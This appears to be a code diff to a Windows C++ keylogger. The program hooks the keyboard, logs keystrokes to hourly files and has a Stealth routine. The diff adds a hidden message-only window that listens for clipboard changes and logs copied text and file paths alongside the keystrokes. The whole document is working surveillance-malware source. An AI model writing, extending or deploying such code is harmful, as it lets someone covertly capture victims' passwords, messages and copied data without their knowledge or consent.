@@ -1,5 +1,6 @@
 #define UNICODE
 #include <Windows.h>
+#include <Shellapi.h>
 #include <cstring>
 #include <cstdio>
 #include <fstream>
@@ -8,6 +9,9 @@
 #include <string>
 #include <time.h>
 #include <map>
+#include <vector>
+
+#pragma comment(lib, "Shell32.lib")
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -70,6 +74,7 @@ const std::map<int, std::string> keyname{
 };
 #endif
 HHOOK _hook;
+HWND clipboard_window = NULL;
 
 // This struct contains the data received by the hook callback. As you see in the callback function
 // it contains the thing you will need: vkCode = virtual key code.
@@ -190,6 +195,164 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
 
+int WriteLog(const std::string& content)
+{
+	struct tm tm_info;
+	const time_t t = time(NULL);
+	localtime_s(&tm_info, &t);
+
+	// Determine current hour and base log file on that to avoid a massive single log file.
+	if (cur_hour != tm_info.tm_hour)
+	{
+		output_file.close();
+		cur_hour = tm_info.tm_hour;
+		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
+	}
+
+	if (!output_file.is_open())
+	{
+		if (log_retry_pending && GetTickCount64() < next_log_retry)
+		{
+			return 0;
+		}
+		if (!OpenLogFile())
+		{
+			return 0;
+		}
+		std::cout << "Logging output to " << output_filename << std::endl;
+	}
+
+	output_file << content;
+	output_file.flush();
+	last_log_activity = GetTickCount64();
+	std::cout << content;
+	return 0;
+}
+
+std::string WideToUtf8(const std::wstring& text)
+{
+	if (text.empty())
+	{
+		return "";
+	}
+
+	int size = WideCharToMultiByte(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
+		NULL, 0, NULL, NULL);
+	if (size <= 0)
+	{
+		return "";
+	}
+
+	std::string result(size, '\0');
+	WideCharToMultiByte(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
+		&result[0], size, NULL, NULL);
+	return result;
+}
+
+void SaveClipboard()
+{
+	if (!OpenClipboard(clipboard_window))
+	{
+		return;
+	}
+
+	std::string clipboard_log;
+	if (IsClipboardFormatAvailable(CF_UNICODETEXT))
+	{
+		HANDLE clipboard_data = GetClipboardData(CF_UNICODETEXT);
+		if (clipboard_data)
+		{
+			const wchar_t* text = static_cast<const wchar_t*>(GlobalLock(clipboard_data));
+			if (text)
+			{
+				std::string utf8_text = WideToUtf8(text);
+				GlobalUnlock(clipboard_data);
+				if (!utf8_text.empty())
+				{
+					clipboard_log = "\n\n[Clipboard text] " + utf8_text;
+				}
+			}
+		}
+	}
+	else if (IsClipboardFormatAvailable(CF_HDROP))
+	{
+		HDROP drop = static_cast<HDROP>(GetClipboardData(CF_HDROP));
+		if (drop)
+		{
+			UINT file_count = DragQueryFileW(drop, 0xFFFFFFFF, NULL, 0);
+			for (UINT i = 0; i < file_count; ++i)
+			{
+				UINT length = DragQueryFileW(drop, i, NULL, 0);
+				std::vector<wchar_t> path(length + 1, L'\0');
+				DragQueryFileW(drop, i, path.data(), length + 1);
+				clipboard_log += "\n" + WideToUtf8(path.data());
+			}
+			if (!clipboard_log.empty())
+			{
+				clipboard_log = "\n\n[Clipboard files]" + clipboard_log;
+			}
+		}
+	}
+
+	CloseClipboard();
+	if (!clipboard_log.empty())
+	{
+		WriteLog(clipboard_log);
+	}
+}
+
+LRESULT CALLBACK ClipboardWindowProc(HWND window, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	switch (message)
+	{
+	case WM_CLIPBOARDUPDATE:
+		SaveClipboard();
+		return 0;
+	case WM_DESTROY:
+		RemoveClipboardFormatListener(window);
+		return 0;
+	default:
+		return DefWindowProc(window, message, wParam, lParam);
+	}
+}
+
+bool StartClipboardListener()
+{
+	const wchar_t* class_name = L"KeyloggerClipboardListener";
+	WNDCLASSW window_class = {};
+	window_class.lpfnWndProc = ClipboardWindowProc;
+	window_class.hInstance = GetModuleHandleW(NULL);
+	window_class.lpszClassName = class_name;
+
+	if (!RegisterClassW(&window_class) && GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
+	{
+		return false;
+	}
+
+	clipboard_window = CreateWindowExW(0, class_name, L"", 0,
+		0, 0, 0, 0, HWND_MESSAGE, NULL, window_class.hInstance, NULL);
+	if (!clipboard_window)
+	{
+		return false;
+	}
+
+	if (!AddClipboardFormatListener(clipboard_window))
+	{
+		DestroyWindow(clipboard_window);
+		clipboard_window = NULL;
+		return false;
+	}
+	return true;
+}
+
+void StopClipboardListener()
+{
+	if (clipboard_window)
+	{
+		DestroyWindow(clipboard_window);
+		clipboard_window = NULL;
+	}
+}
 
 int Save(int key_stroke)
 {
@@ -264,36 +427,9 @@ int Save(int key_stroke)
 		output << char(key);
 	}
 #endif
-	// Determine current hour and base log file on that
-	// To avoid massive single logfile
-	if (cur_hour != tm_info.tm_hour) {
-		output_file.close();
-		cur_hour = tm_info.tm_hour;
-		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
-	}
-
-	if (!output_file.is_open())
-	{
-		if (log_retry_pending && GetTickCount64() < next_log_retry)
-		{
-			return 0;
-		}
-		if (!OpenLogFile())
-		{
-			return 0;
-		}
-		std::cout << "Logging output to " << output_filename << std::endl;
-	}
-
-	// Keep the file open while active, and flush each write so no data is lost on idle close.
-	output_file << output.str();
-	output_file.flush();
-	last_log_activity = GetTickCount64();
-
-	std::cout << output.str();
-
-	return 0;
+	return WriteLog(output.str());
 }
+
 void Stealth()
 {
 #ifdef visible
@@ -348,8 +484,9 @@ int main(int argc, char* argv[])
 
 	// Call the hook function and set the hook.
 	SetHook();
+	StartClipboardListener();
 
-	// Keep processing hook messages while checking the log idle timeout once per second.
+	// Keep processing hook and clipboard messages while checking the log idle timeout once per second.
 	while (true)
 	{
 		DWORD wait_result = MsgWaitForMultipleObjects(0, NULL, FALSE, 1000, QS_ALLINPUT);
@@ -361,6 +498,7 @@ int main(int argc, char* argv[])
 				if (msg.message == WM_QUIT)
 				{
 					ReleaseHook();
+					StopClipboardListener();
 					output_file.close();
 					return 0;
 				}
@@ -371,6 +509,7 @@ int main(int argc, char* argv[])
 		else if (wait_result == WAIT_FAILED)
 		{
 			ReleaseHook();
+			StopClipboardListener();
 			output_file.close();
 			return 1;
 		}
